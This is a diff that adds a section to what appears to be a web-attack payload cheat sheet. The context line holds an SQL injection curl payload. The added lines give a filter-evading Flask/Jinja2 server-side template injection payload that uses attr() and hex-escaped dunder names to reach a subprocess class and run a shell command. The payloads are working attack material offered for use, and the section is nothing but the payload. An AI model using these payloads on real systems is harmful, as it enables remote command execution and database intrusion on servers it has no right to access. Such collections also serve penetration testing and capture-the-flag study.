@@ -3471,6 +3471,16 @@ curl [url]/ -d "input=' or 1=1--+ "
 
 -----------------
 
+### SSTI bypass with attr() if [] is filtered
+
+------------------
+
+- Payload
+
+```flask
+()|attr('\x5f\x5f\x63lass\x5f\x5f')|attr('\x5f\x5f\x62ase\x5f\x5f')|attr('\x5f\x5fsub\x63lasses\x5f\x5f')()|attr('\x5f\x5f\x67etitem\x5f\x5f')(356)('ls',shell=True,stdout=-1)|attr('communicate')()
+```
+
 
 
 
